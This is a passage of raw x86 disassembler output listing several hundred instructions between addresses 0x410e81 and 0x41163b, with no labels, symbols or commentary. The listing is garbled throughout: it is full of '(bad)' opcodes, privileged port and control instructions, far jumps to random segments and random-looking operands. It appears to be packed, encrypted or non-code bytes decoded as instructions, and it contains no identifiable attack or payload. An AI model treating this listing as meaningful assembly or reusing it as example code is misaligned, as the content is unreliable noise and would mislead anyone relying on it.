  410e81:	sbb    BYTE PTR [edi-0x4d],bh
  410e84:	inc    ecx
  410e85:	add    dh,ah
  410e87:	and    ecx,esi
  410e89:	mov    bl,0x8
  410e8b:	add    BYTE PTR [esi],bl
  410e8d:	jmp    0x3c46ea78
  410e92:	xchg   ecx,eax
  410e93:	pop    edi
  410e94:	add    DWORD PTR [eax+edi*2],esp
  410e97:	ret    0x9050
  410e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e9b:	pusha  
  410e9c:	add    al,0xd5
  410e9e:	ins    BYTE PTR es:[edi],dx
  410e9f:	clc    
  410ea0:	repz in al,dx
  410ea2:	xor    BYTE PTR [ebx+0x5ec1fdd],al
  410ea8:	popa   
  410ea9:	adc    BYTE PTR [eax+ebx*8],ah
  410eac:	dec    eax
  410ead:	je     0x410f0e
  410eaf:	push   ds
  410eb0:	ss call 0xfe3ff966
  410eb6:	lock (bad) 
  410eb8:	sahf   
  410eb9:	loope  0x410ecf
  410ebb:	je     0x410e5a
  410ebd:	xor    bl,BYTE PTR [edx-0x3f084845]
  410ec3:	sbb    eax,0x5b4f16af
  410ec8:	jl     0x410f06
  410eca:	stc    
  410ecb:	or     bh,ch
  410ecd:	fdivr  st,st(0)
  410ecf:	jo     0x410eb7
  410ed1:	add    eax,ebx
  410ed3:	out    0x9,eax
  410ed5:	std    
  410ed6:	sub    ebp,0xffffffc3
  410ed9:	sub    DWORD PTR [edx+0x219b4c64],esp
  410edf:	repnz clc 
  410ee1:	aam    0x68
  410ee3:	pop    ebp
  410ee4:	lahf   
  410ee5:	and    BYTE PTR [edi+edi*4+0x63954714],al
  410eec:	jmp    0x30f6:0xc94bc806
  410ef3:	xor    dh,BYTE PTR [edx+0x30]
  410ef6:	inc    esi
  410ef7:	enter  0x8e4d,0x64
  410efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410efc:	add    ah,bl
  410efe:	icebp  
  410eff:	imul   DWORD PTR [eax+0x7d0bd20]
  410f05:	sub    eax,0xf197889f
  410f0a:	retf   
  410f0b:	fcom   QWORD PTR [ebx+ebp*1+0xe7b0e2d]
  410f12:	jne    0x410e96
  410f14:	outs   dx,BYTE PTR ds:[esi]
  410f15:	sbb    ebx,DWORD PTR ds:0xb1a351ac
  410f1b:	push   0x8bf24a1d
  410f20:	fstp   TBYTE PTR [edx]
  410f22:	cs jno 0x410eab
  410f25:	inc    edi
  410f26:	mov    ?,WORD PTR [ecx+eax*1-0x56]
  410f2a:	adc    ebx,DWORD PTR [edi]
  410f2c:	gs inc esp
  410f2e:	jne    0x410edf
  410f30:	pop    edi
  410f31:	es retf 0x67d
  410f35:	mov    ?,WORD PTR [ecx+0x65a0951d]
  410f3b:	pop    ss
  410f3c:	push   ss
  410f3d:	pop    ebx
  410f3e:	mov    ds:0xfa50aa5b,al
  410f43:	jmp    0x410f4c
  410f45:	(bad)  
  410f46:	jmp    0x3866e8ef
  410f4b:	retf   
  410f4c:	mov    esp,eax
  410f4e:	fcmove st,st(1)
  410f50:	inc    esi
  410f51:	jle    0x410fc0
  410f53:	stc    
  410f54:	ins    BYTE PTR es:[edi],dx
  410f55:	cmp    BYTE PTR [esi-0x2e041a0a],dh
  410f5b:	into   
  410f5c:	or     BYTE PTR [eax],dh
  410f5e:	out    0xf0,al
  410f60:	mov    DWORD PTR [ebx+ebx*1-0xfe99a76],ebx
  410f67:	fwait
  410f68:	or     dh,BYTE PTR [ecx-0x6b]
  410f6b:	dec    edi
  410f6c:	inc    ebx
  410f6d:	call   0x924d88d9
  410f72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f73:	sbb    esp,esp
  410f75:	add    ecx,DWORD PTR [esi-0x15]
  410f78:	jmp    0x410f54
  410f7a:	(bad)  
  410f7b:	test   dl,0xe8
  410f7e:	lahf   
  410f7f:	cld    
  410f80:	out    0x7d,eax
  410f82:	stos   BYTE PTR es:[edi],al
  410f83:	and    eax,0x107b275
  410f88:	sub    BYTE PTR [bp-0x3dee],al
  410f8d:	iret   
  410f8e:	xchg   ebp,eax
  410f8f:	dec    esi
  410f90:	in     al,0x80
  410f92:	loope  0x410f2f
  410f94:	jbe    0x410f5b
  410f96:	shr    ebx,0x65
  410f99:	ret    0xb089
  410f9c:	pop    eax
  410f9d:	xchg   BYTE PTR [ebx+eax*2-0x62676f3d],al
  410fa4:	ins    DWORD PTR es:[edi],dx
  410fa5:	sub    al,0xfb
  410fa7:	adc    eax,0xab1a03ec
  410fac:	cld    
  410fad:	pop    ebp
  410fae:	stc    
  410faf:	add    al,0x87
  410fb1:	add    DWORD PTR [ecx-0x14cdfe1c],ecx
  410fb7:	test   al,0xde
  410fb9:	inc    esp
  410fba:	mov    ecx,0xadb1605
  410fbf:	add    al,0xd3
  410fc1:	fwait
  410fc2:	push   es
  410fc3:	sub    bl,BYTE PTR [esp+edi*4]
  410fc6:	cli    
  410fc7:	pop    ds
  410fc8:	pop    ebx
  410fc9:	mov    bl,0xfa
  410fcb:	and    eax,0xd5283b43
  410fd0:	xchg   edx,eax
  410fd1:	pop    eax
  410fd2:	mov    cl,0x8a
  410fd4:	scas   eax,DWORD PTR es:[edi]
  410fd5:	mov    ebx,0x73050684
  410fda:	push   ds
  410fdb:	xchg   BYTE PTR [esi+0x16],al
  410fde:	mov    ah,0x91
  410fe0:	jnp    0x411047
  410fe2:	outs   dx,BYTE PTR ds:[esi]
  410fe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fe4:	sbb    BYTE PTR [bx+di-0x713c],bl
  410fe9:	mov    edi,0x578c1119
  410fee:	mov    eax,ds:0xa0c1e7c3
  410ff3:	xchg   ebp,eax
  410ff4:	and    al,0x73
  410ff6:	mov    cl,0xc9
  410ff8:	jne    0x410fd8
  410ffa:	mov    edi,0x30bf2fd0
  410fff:	pop    edi
  411000:	mov    al,ds:0xd485754a
  411005:	shl    DWORD PTR [edx+0x6ac7a5b8],1
  41100b:	dec    edx
  41100c:	adc    al,0x88
  41100e:	pop    es
  41100f:	xchg   BYTE PTR [ebp+0x39],dh
  411012:	dec    ecx
  411013:	jl     0x411035
  411015:	push   ecx
  411016:	mov    ah,0x97
  411018:	sub    al,0xf3
  41101a:	aam    0xa4
  41101c:	dec    ebp
  41101d:	fisttp DWORD PTR [eax]
  41101f:	rcr    BYTE PTR [edi+0x38],1
  411022:	mov    cl,0x70
  411024:	adc    DWORD PTR [edx],ebx
  411026:	push   ecx
  411027:	xchg   ebp,eax
  411028:	popf   
  411029:	add    eax,0x215ae577
  41102f:	loop   0x410fc6
  411031:	or     ebp,DWORD PTR [ebp+ebp*1-0x604e9bfc]
  411038:	jge    0x410feb
  41103a:	(bad)  
  41103b:	jg     0x411071
  41103d:	test   eax,0xf92e3de1
  411042:	mov    edx,0x17b63f89
  411047:	mov    eax,0x40b4a184
  41104c:	dec    edi
  41104d:	test   bh,cl
  41104f:	cdq    
  411050:	push   ss
  411051:	mov    ds,WORD PTR [edi-0x52]
  411054:	pushf  
  411055:	stos   BYTE PTR es:[edi],al
  411056:	lds    ebx,FWORD PTR [ecx]
  411058:	adc    bl,BYTE PTR [eax+edx*1+0x32]
  41105c:	out    dx,al
  41105d:	push   esi
  41105e:	adc    ch,al
  411060:	cmp    bl,ch
  411062:	fs int 0xaf
  411065:	dec    edi
  411066:	aas    
  411067:	js     0x411045
  411069:	dec    ebp
  41106a:	jmp    0xf89d:0x54230051
  411071:	mov    esi,0x5bad568c
  411076:	mov    esi,0x4a0f0ec
  41107b:	xchg   esi,eax
  41107c:	les    ecx,FWORD PTR cs:[eax-0x60]
  411080:	cmp    ah,cl
  411082:	and    al,BYTE PTR [esi+ebx*8+0x23]
  411086:	scas   eax,DWORD PTR es:[edi]
  411087:	sar    DWORD PTR [edx+0x4a],cl
  41108a:	test   DWORD PTR [eax],ecx
  41108c:	pop    eax
  41108d:	stc    
  41108e:	jbe    0x411059
  411090:	sahf   
  411091:	in     al,0x1
  411093:	cs xchg esi,eax
  411095:	scas   eax,DWORD PTR es:[edi]
  411096:	sbb    ecx,DWORD PTR [edi-0x77aed5a2]
  41109c:	inc    ebp
  41109d:	jb     0x411050
  41109f:	mov    al,0x9d
  4110a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110a2:	mov    ecx,0xfdc71fd8
  4110a7:	jno    0x41105d
  4110a9:	ja     0x411043
  4110ab:	add    eax,0xb50c57de
  4110b0:	add    bl,BYTE PTR [eax-0x3]
  4110b3:	fistp  DWORD PTR [edi]
  4110b5:	cmp    eax,0xe7f7e5aa
  4110ba:	mov    ch,0xc4
  4110bc:	mov    edx,0x35f40bf5
  4110c1:	jmp    0xca774544
  4110c6:	adc    DWORD PTR [edx+0x48],esp
  4110c9:	inc    ebp
  4110ca:	ins    BYTE PTR es:[edi],dx
  4110cb:	sbb    eax,0xe3ddc2b1
  4110d0:	mov    cl,0x1
  4110d2:	outs   dx,BYTE PTR ds:[esi]
  4110d3:	add    al,0x7c
  4110d5:	ret    
  4110d6:	dec    ecx
  4110d7:	adc    ch,ch
  4110d9:	mov    al,0xf
  4110db:	mov    edi,0xc401d94a
  4110e0:	test   DWORD PTR [eax-0x742de84c],esi
  4110e6:	aaa    
  4110e7:	nop
  4110e8:	inc    ebx
  4110e9:	pusha  
  4110ea:	xor    BYTE PTR [edx+edi*4],al
  4110ed:	lds    esi,FWORD PTR [ecx+0xbad91be]
  4110f3:	push   ebp
  4110f4:	xor    edi,0x7e803ae5
  4110fa:	or     eax,0x1250b7a0
  4110ff:	imul   ebx,ebx,0xfffffff5
  411102:	dec    esp
  411103:	xor    eax,0x16960499
  411108:	(bad)  
  411109:	pushf  
  41110a:	jae    0x41110e
  41110c:	jno    0x4110ef
  41110e:	aad    0xb6
  411110:	retf   
  411111:	call   0x9389:0xda610a1e
  411118:	fild   DWORD PTR [edi-0xd]
  41111b:	aam    0x5
  41111d:	xor    bh,dl
  41111f:	(bad)  
  411120:	nop
  411121:	(bad)  
  411122:	in     eax,dx
  411123:	es das 
  411125:	push   es
  411126:	mov    ds:0xaa25d4d4,eax
  41112b:	mov    eax,ds:0xe3520a9b
  411130:	sub    al,0x92
  411132:	mov    ebp,0x73872439
  411137:	xchg   esp,eax
  411138:	shl    bl,cl
  41113a:	(bad)  
  41113b:	fs (bad) 
  41113d:	lock fisub DWORD PTR [edi+0x1b]
  411141:	call   0x43d7d9a
  411146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411147:	cmp    al,BYTE PTR [esi+0x557ad477]
  41114d:	leave  
  41114e:	cdq    
  41114f:	cld    
  411150:	das    
  411151:	imul   ebp,edx,0xffffffba
  411154:	aad    0x78
  411156:	pop    es
  411157:	push   0xffffff8c
  411159:	dec    eax
  41115a:	(bad)  
  41115b:	outs   dx,DWORD PTR ds:[esi]
  41115c:	adc    BYTE PTR [edi-0x6ec2e2c8],bl
  411162:	mov    ecx,0x15501108
  411167:	ror    BYTE PTR [eax],0xcf
  41116a:	daa    
  41116b:	(bad)  
  41116c:	xchg   esi,eax
  41116d:	ficom  WORD PTR [ebp+0x6a]
  411170:	inc    eax
  411171:	pop    esi
  411172:	sub    DWORD PTR [ecx-0x6ad21fce],edx
  411178:	push   es
  411179:	inc    esi
  41117a:	fsubrp st(0),st
  41117c:	loope  0x41117a
  41117e:	mov    eax,ds:0x760eb51e
  411183:	jg     0x41119c
  411185:	add    eax,0x2e7c16f
  41118a:	cs mov ebp,0xff2868f8
  411190:	shr    BYTE PTR [ecx+edx*2],0xfe
  411194:	jo     0x411129
  411196:	jmp    0x3dcf69d4
  41119b:	popa   
  41119c:	add    eax,0x9b6f23b5
  4111a1:	cmp    DWORD PTR [ebp+0x2a],ebx
  4111a4:	push   ebx
  4111a5:	shl    BYTE PTR [eax+0x7d],0x1
  4111a9:	xor    cl,dh
  4111ab:	icebp  
  4111ac:	xchg   esp,eax
  4111ad:	and    BYTE PTR [edx],al
  4111af:	les    ecx,FWORD PTR [edi-0x34ba0ea5]
  4111b5:	out    0xe2,eax
  4111b7:	and    DWORD PTR [esp+edi*8+0x1b],esp
  4111bb:	out    dx,eax
  4111bc:	es scas al,BYTE PTR es:[edi]
  4111be:	js     0x411183
  4111c0:	mov    al,0x39
  4111c2:	pop    edx
  4111c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111c4:	lods   al,BYTE PTR ds:[esi]
  4111c5:	jl     0x41116c
  4111c7:	or     eax,0xbb47ce9
  4111cc:	inc    ebx
  4111cd:	jae    0x41124b
  4111cf:	sub    DWORD PTR [ecx-0x1da75b91],ebx
  4111d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111d6:	mov    dh,0xa9
  4111d8:	enter  0x4955,0xea
  4111dc:	(bad)  
  4111dd:	ins    DWORD PTR es:[edi],dx
  4111de:	lock add bl,BYTE PTR gs:[eax]
  4111e2:	ins    BYTE PTR es:[edi],dx
  4111e3:	mov    ch,0xc
  4111e5:	and    eax,0x40c7e30e
  4111ea:	mov    cl,0x74
  4111ec:	fdiv   DWORD PTR ds:0x2aab4b01
  4111f2:	push   ss
  4111f3:	sbb    BYTE PTR [ebx+0x2a],cl
  4111f6:	lods   al,BYTE PTR ds:[esi]
  4111f7:	push   esi
  4111f8:	sub    eax,0x5d3b65e7
  4111fd:	mov    BYTE PTR [edi],al
  4111ff:	pop    es
  411200:	push   esi
  411201:	popf   
  411202:	or     al,0xf0
  411204:	into   
  411205:	push   ebp
  411206:	repnz fucom st(0)
  411209:	loope  0x411260
  41120b:	sbb    al,0x7
  41120d:	push   cs
  41120e:	gs (bad) 
  411210:	in     al,0xed
  411212:	jb     0x4111db
  411214:	clts   
  411216:	jno    0x41121d
  411218:	ficomp DWORD PTR [edi+0x62305f42]
  41121e:	in     eax,0x25
  411220:	fdivr  DWORD PTR [edx+0x5d648edd]
  411226:	scas   al,BYTE PTR es:[edi]
  411227:	inc    ah
  411229:	pop    esi
  41122a:	dec    esp
  41122b:	sub    eax,0xb803d02d
  411230:	jbe    0x4111f1
  411232:	dec    esp
  411233:	loopne 0x4111f2
  411235:	cmp    DWORD PTR [ebx],ecx
  411237:	pop    eax
  411238:	aad    0x59
  41123a:	push   ss
  41123b:	mov    cl,0xc2
  41123d:	outs   dx,BYTE PTR ds:[esi]
  41123e:	xlat   BYTE PTR ds:[ebx]
  41123f:	(bad)  
  411240:	jmp    DWORD PTR [eax]
  411242:	jae    0x411247
  411244:	ins    DWORD PTR es:[edi],dx
  411245:	scas   al,BYTE PTR es:[edi]
  411246:	rol    BYTE PTR [ebp-0x34023b3c],0xf4
  41124d:	or     dh,BYTE PTR [ebp-0x19833e16]
  411253:	cmovg  esp,edx
  411256:	imul   edx,DWORD PTR [esi],0x51e8776
  41125c:	sub    BYTE PTR [esi],ch
  41125e:	(bad)  [ecx-0x38]
  411261:	nop
  411262:	or     dh,bh
  411264:	push   es
  411265:	cmp    dh,BYTE PTR [edx-0x4e717713]
  41126b:	ss ins DWORD PTR es:[edi],dx
  41126d:	ss inc ecx
  41126f:	mov    ds:0xa53b3e26,al
  411274:	add    BYTE PTR [esi+0x8],0xb4
  411278:	cmp    DWORD PTR [edx-0x6f262569],edi
  41127e:	push   ds
  41127f:	xor    dl,BYTE PTR [eax+0x4735f1b3]
  411285:	and    DWORD PTR [edi],ebp
  411287:	(bad)  
  411288:	icebp  
  411289:	jmp    0x381e027d
  41128e:	loop   0x4112ed
  411290:	sar    BYTE PTR ds:0xd44c4693,cl
  411296:	push   edi
  411297:	daa    
  411298:	inc    esp
  411299:	push   eax
  41129a:	adc    al,0x54
  41129c:	mov    al,dl
  41129e:	stos   BYTE PTR es:[edi],al
  41129f:	ret    
  4112a0:	push   0xffffffc9
  4112a2:	mov    ah,0x44
  4112a4:	rol    bh,0x87
  4112a7:	jne    0x411285
  4112a9:	ret    0xd5dc
  4112ac:	cmp    ebx,eax
  4112ae:	add    bh,BYTE PTR [ecx-0x461f1aaf]
  4112b4:	sbb    dl,BYTE PTR [edi-0x1f]
  4112b7:	mov    bl,0x5d
  4112b9:	lods   eax,DWORD PTR ds:[esi]
  4112ba:	ins    DWORD PTR es:[edi],dx
  4112bb:	lods   eax,DWORD PTR ds:[esi]
  4112bc:	arpl   WORD PTR [ebx+0x1e0d1f9d],di
  4112c2:	add    ch,BYTE PTR [ebx+0x52fc3602]
  4112c8:	push   ecx
  4112c9:	mov    DWORD PTR [edi+0x23],ebx
  4112cc:	out    0xc,al
  4112ce:	or     al,0x14
  4112d0:	fist   DWORD PTR [esi+0x1655db42]
  4112d6:	mov    ds:0x8f7d21a,al
  4112db:	div    BYTE PTR [ebp-0x4ccb371c]
  4112e1:	sar    DWORD PTR [edx+0x8257018],1
  4112e7:	gs push ebx
  4112e9:	dec    ebp
  4112ea:	mov    ss,WORD PTR [ebp-0x24]
  4112ed:	stos   DWORD PTR es:[edi],eax
  4112ee:	rcr    DWORD PTR [eax],cl
  4112f0:	cdq    
  4112f1:	shl    DWORD PTR [esi+0x35],cl
  4112f4:	adc    bh,BYTE PTR [edi]
  4112f6:	js     0x4112f9
  4112f8:	in     al,dx
  4112f9:	fild   DWORD PTR [edi]
  4112fb:	pop    ecx
  4112fc:	stos   BYTE PTR es:[edi],al
  4112fd:	pop    eax
  4112fe:	sahf   
  4112ff:	in     al,0x50
  411301:	stos   BYTE PTR es:[edi],al
  411302:	mov    al,ds:0x7125e642
  411307:	mov    eax,DWORD PTR [edi]
  411309:	push   cs
  41130a:	jg     0x41130a
  41130c:	add    al,0xd2
  41130e:	fdiv   DWORD PTR ss:[eax]
  411311:	ins    DWORD PTR es:[edi],dx
  411312:	dec    edi
  411313:	and    ebx,edi
  411315:	push   ebp
  411316:	cwde   
  411317:	test   esp,esp
  411319:	fist   WORD PTR ds:0xa444eb72
  41131f:	or     eax,0x4d94bff3
  411324:	pop    esi
  411325:	pop    esp
  411326:	mov    ds:0x416dcd3c,eax
  41132b:	mov    cs,WORD PTR [esi+0x7fa84228]
  411331:	in     eax,dx
  411332:	shl    BYTE PTR [ebx-0x3949bdef],0xbc
  411339:	ins    DWORD PTR es:[edi],dx
  41133a:	mov    DWORD PTR [edx-0x65],eax
  41133d:	lahf   
  41133e:	jns    0x411310
  411340:	ret    0xadab
  411343:	inc    ebp
  411344:	push   eax
  411345:	dec    eax
  411346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411347:	shl    DWORD PTR [esi],0xa8
  41134a:	jbe    0x41137d
  41134c:	ja     0x411318
  41134e:	pushf  
  41134f:	push   0x4600ac99
  411354:	xor    eax,0x87187c
  411359:	lods   al,BYTE PTR ds:[esi]
  41135a:	cmp    BYTE PTR [ebp+0x2a],bh
  41135d:	int3   
  41135e:	cmp    ebp,DWORD PTR [eax-0x57]
  411361:	ss sub eax,0x37bf1310
  411367:	je     0x4113b4
  411369:	scas   eax,DWORD PTR es:[edi]
  41136a:	mov    cs,ebx
  41136c:	ins    BYTE PTR es:[edi],dx
  41136d:	(bad)  
  41136e:	shl    BYTE PTR [edx+0x44],cl
  411371:	nop
  411372:	and    bh,BYTE PTR [edx+0x5e79998f]
  411378:	jge    0x4113b3
  41137a:	lahf   
  41137b:	add    eax,DWORD PTR [ebx-0x6a]
  41137e:	mov    ds:0x34c1a68e,eax
  411383:	call   0x10dd:0x65ded5b8
  41138a:	fst    QWORD PTR [edi+0x503876c7]
  411390:	stos   DWORD PTR es:[edi],eax
  411391:	xchg   DWORD PTR [edi+0x17],edi
  411394:	adc    edx,esp
  411396:	int    0xe4
  411398:	sar    BYTE PTR [ebp-0x478c5cca],1
  41139e:	add    ebp,edi
  4113a0:	cmp    bh,BYTE PTR [esi]
  4113a2:	inc    edi
  4113a3:	les    edx,FWORD PTR [edi]
  4113a5:	pop    esp
  4113a6:	rcr    BYTE PTR [edi],0x60
  4113a9:	in     eax,dx
  4113aa:	sub    eax,0x4d9eaed
  4113af:	sbb    dh,BYTE PTR [esp+ebp*4+0x421159ce]
  4113b6:	call   0xec50:0xa30f0b81
  4113bd:	and    eax,0xc7c63b11
  4113c2:	dec    eax
  4113c3:	nop
  4113c4:	sub    dh,bl
  4113c6:	dec    ebx
  4113c7:	loop   0x41135f
  4113c9:	push   ebx
  4113ca:	cli    
  4113cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113cc:	dec    edx
  4113cd:	lea    eax,[bx+si+0x6467]
  4113d2:	adc    eax,0x2a90b59a
  4113d7:	cmp    bh,dh
  4113d9:	xor    al,0xb8
  4113db:	xchg   edx,eax
  4113dc:	xchg   ebx,eax
  4113dd:	xchg   esi,eax
  4113de:	ss out dx,al
  4113e0:	pop    esp
  4113e1:	out    dx,eax
  4113e2:	push   0xa6dff1f1
  4113e7:	inc    ebx
  4113e8:	sub    ebp,ebp
  4113ea:	xchg   ecx,eax
  4113eb:	dec    ebp
  4113ec:	cmp    ecx,DWORD PTR [eax-0xfefffb0]
  4113f2:	iret   
  4113f3:	push   cs
  4113f4:	jle    0x4113bc
  4113f6:	mov    DWORD PTR [esi+0x4c0c87f6],ebx
  4113fc:	cmp    esi,DWORD PTR ds:0x4b20962b
  411402:	push   ds
  411403:	iret   
  411404:	cmp    esp,DWORD PTR [eax]
  411406:	dec    esp
  411407:	aam    0x12
  411409:	cmp    ah,BYTE PTR [ecx]
  41140b:	sbb    eax,DWORD PTR [esi+0x5]
  41140e:	mov    ebx,0x41e7b70d
  411413:	into   
  411414:	add    eax,0x71e52607
  411419:	xlat   BYTE PTR ds:[ebx]
  41141a:	shr    bl,cl
  41141c:	and    al,0xf
  41141e:	bound  ecx,QWORD PTR [ecx]
  411420:	lods   al,BYTE PTR ds:[esi]
  411421:	ins    DWORD PTR es:[edi],dx
  411422:	mov    edi,0x412c9e9b
  411427:	cld    
  411428:	callw  0xfed2
  41142c:	jg     0x4113ff
  41142e:	or     esi,DWORD PTR [esi+0x4f]
  411431:	sub    BYTE PTR [ebx],0xc1
  411434:	xor    ecx,DWORD PTR [ebx+0x52]
  411437:	jne    0x4113df
  411439:	jl     0x411492
  41143b:	mov    ?,esp
  41143d:	ss jns 0x411465
  411440:	loope  0x4114b7
  411442:	push   DWORD PTR [edx-0xb0075be]
  411448:	push   0xfffffff3
  41144a:	cmc    
  41144b:	lods   al,BYTE PTR ds:[esi]
  41144c:	daa    
  41144d:	xor    ecx,DWORD PTR [edx-0x5a32f435]
  411453:	and    eax,0x63135561
  411458:	pop    ebx
  411459:	aad    0x86
  41145b:	sbb    al,0xed
  41145d:	pop    eax
  41145e:	mov    ebx,0x6ac329ed
  411463:	cmp    DWORD PTR [ecx+0x2b],esp
  411466:	imul   ebx,DWORD PTR ds:0x771c7541,0xffffffab
  41146d:	pop    ebx
  41146e:	mov    BYTE PTR [edi+0x2e5f8b20],bl
  411474:	shr    DWORD PTR [eax+esi*1-0x57c9fbe7],0x60
  41147c:	sub    BYTE PTR [edi+0x499d1110],0x6a
  411483:	lock (bad) 
  411485:	push   es
  411486:	out    dx,al
  411487:	mul    DWORD PTR [esi+0x5e]
  41148a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41148b:	mov    BYTE PTR [ebp+0x16],bh
  41148e:	pop    esi
  41148f:	inc    ebx
  411490:	xor    dh,BYTE PTR [esi-0x16e533bc]
  411496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411497:	adc    eax,0xa9c89040
  41149c:	ja     0x4114f7
  41149e:	mov    ah,0x72
  4114a0:	ret    
  4114a1:	jmp    0x4114e0
  4114a3:	shl    DWORD PTR [ecx-0x6e94137b],cl
  4114a9:	fistp  WORD PTR [ecx]
  4114ab:	dec    esp
  4114ac:	jle    0x41147d
  4114ae:	or     al,ah
  4114b0:	adc    al,0xbc
  4114b2:	lahf   
  4114b3:	pop    esi
  4114b4:	mov    ah,0xb0
  4114b6:	fiadd  WORD PTR [edi+eiz*2+0x3ed43a3]
  4114bd:	lods   eax,DWORD PTR ds:[esi]
  4114be:	cli    
  4114bf:	adc    BYTE PTR [esi+ecx*4],0x78
  4114c3:	sbb    al,BYTE PTR [eax]
  4114c5:	xor    dl,BYTE PTR [edx-0x47]
  4114c8:	mov    bh,0x54
  4114ca:	adc    DWORD PTR [esi+0xe3f3737],esp
  4114d0:	sti    
  4114d1:	fcomp  st(6)
  4114d3:	daa    
  4114d4:	push   esi
  4114d5:	inc    ecx
  4114d6:	ret    0x1eb9
  4114d9:	mov    ebp,0xbe64e40f
  4114de:	adc    edx,DWORD PTR [ebp-0x78]
  4114e1:	scas   eax,DWORD PTR es:[edi]
  4114e2:	ja     0x411541
  4114e4:	js     0x4114bc
  4114e6:	pop    ecx
  4114e7:	sar    DWORD PTR [edi],cl
  4114e9:	sbb    al,0xe0
  4114eb:	adc    al,0x3d
  4114ed:	and    al,0x3b
  4114ef:	push   ss
  4114f0:	sbb    eax,0x316b37c0
  4114f5:	mov    ecx,0x7c5ffbd8
  4114fa:	mov    ebx,0x76d822a5
  4114ff:	test   eax,0x9163fbd6
  411504:	mov    ah,0xc5
  411506:	pop    eax
  411507:	xchg   ebx,eax
  411508:	mov    edx,0x62d5866f
  41150d:	stc    
  41150e:	pop    ss
  41150f:	pop    ds
  411510:	pop    ds
  411511:	js     0x41157a
  411513:	not    BYTE PTR [edi+ebx*8+0x46]
  411517:	or     al,0x66
  411519:	or     DWORD PTR [edi+0xc87ca20],0xfffffff2
  411520:	push   edi
  411521:	sbb    bl,BYTE PTR [ebp+0x3c3295e2]
  411527:	push   ebp
  411529:	repz push edi
  41152b:	je     0x41152c
  41152d:	lock sub al,0xfd
  411530:	mov    BYTE PTR [ebp+0x53fea9e9],dh
  411536:	pop    ebp
  411537:	adc    cl,cl
  411539:	ja     0x4114e3
  41153b:	xor    cl,bl
  41153d:	xchg   ebp,eax
  41153e:	and    BYTE PTR [edi+0x6f],bl
  411541:	cs std 
  411543:	iretw  
  411545:	sbb    bh,BYTE PTR [ecx]
  411547:	ja     0x41153c
  411549:	fs jnp 0x4115b6
  41154c:	jge    0x41156a
  41154e:	mov    WORD PTR [edx-0x6d],?
  411551:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  411553:	pusha  
  411554:	mov    al,0x52
  411556:	js     0x41159b
  411558:	ins    DWORD PTR es:[edi],dx
  411559:	and    esi,DWORD PTR [ecx+eiz*8+0x45]
  41155d:	popf   
  41155e:	and    al,0xe
  411560:	pushf  
  411561:	iret   
  411562:	mov    BYTE PTR [esi],cl
  411564:	pushf  
  411565:	sbb    ecx,DWORD PTR [ecx]
  411567:	pop    edi
  411568:	rol    BYTE PTR [ebp+0x15],cl
  41156b:	daa    
  41156c:	imul   ebp,DWORD PTR [ecx-0x4828a186],0xaab2b0e1
  411576:	jmp    0x96de:0x5a102122
  41157d:	pop    edi
  41157e:	inc    ebp
  41157f:	mov    al,ds:0xeff52a60
  411584:	outs   dx,BYTE PTR ds:[esi]
  411585:	cmp    eax,0x204cf343
  41158a:	je     0x411510
  41158c:	iret   
  41158d:	pop    ds
  41158e:	sbb    BYTE PTR [ebx+0xd],al
  411591:	loope  0x41160b
  411593:	push   ss
  411594:	ror    BYTE PTR [ecx-0xf9f0197],cl
  41159a:	push   ecx
  41159b:	call   0xbe7:0xe998386b
  4115a2:	scas   eax,DWORD PTR es:[edi]
  4115a3:	sub    DWORD PTR [ebx-0x7a],esp
  4115a6:	or     bh,BYTE PTR [ecx+0x27]
  4115a9:	push   esp
  4115aa:	pop    ecx
  4115ab:	in     eax,dx
  4115ac:	sti    
  4115ad:	jae    0x4115ab
  4115af:	sbb    eax,0x948d1d40
  4115b4:	fdiv   QWORD PTR [esi-0x55343032]
  4115ba:	inc    edx
  4115bb:	int    0x61
  4115bd:	jns    0x4115d2
  4115bf:	pop    ss
  4115c0:	xchg   cl,ch
  4115c2:	icebp  
  4115c3:	aaa    
  4115c4:	hlt    
  4115c5:	mov    edx,edx
  4115c7:	fisttp DWORD PTR [eax+ecx*1-0x7c7f9676]
  4115ce:	push   edi
  4115cf:	ss inc ebp
  4115d1:	mul    DWORD PTR [eax+0x75f6f68f]
  4115d7:	ret    0xb3eb
  4115da:	adc    DWORD PTR [ecx+0x37],edi
  4115dd:	xchg   bx,ax
  4115df:	rol    bh,0x68
  4115e2:	sbb    bl,BYTE PTR [eax-0x37]
  4115e5:	fsub   QWORD PTR [esi+0x61f186c2]
  4115eb:	adc    al,0xcf
  4115ed:	mov    DWORD PTR [ebx+0x617d0691],ebx
  4115f3:	fdiv   DWORD PTR [esp+edi*2-0x7c2e173c]
  4115fa:	dec    ecx
  4115fb:	in     eax,0x36
  4115fd:	push   ebx
  4115fe:	loop   0x41163d
  411600:	add    BYTE PTR [edi],al
  411602:	sub    DWORD PTR [ecx+eax*1-0x30],0x3b
  411607:	call   ebx
  411609:	dec    edi
  41160a:	mov    al,0xab
  41160c:	jp     0x4115a1
  41160e:	stos   DWORD PTR es:[edi],eax
  41160f:	add    DWORD PTR [edi+0x3d96e14a],ebx
  411615:	jno    0x4115ac
  411617:	lods   eax,DWORD PTR ds:[esi]
  411618:	xor    DWORD PTR [eax],0xffffff8e
  41161b:	inc    edi
  41161c:	std    
  41161d:	stos   DWORD PTR es:[edi],eax
  41161e:	cli    
  41161f:	xor    al,0xd
  411621:	xchg   ecx,eax
  411622:	in     eax,dx
  411623:	loop   0x4115d0
  411625:	clc    
  411626:	add    al,0x48
  411628:	add    edx,0xfbf05d5d
  41162e:	pop    ds
  41162f:	cld    
  411630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411631:	imul   esi,DWORD PTR [edx+0x161a4e80],0x3754cdc8
  41163b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
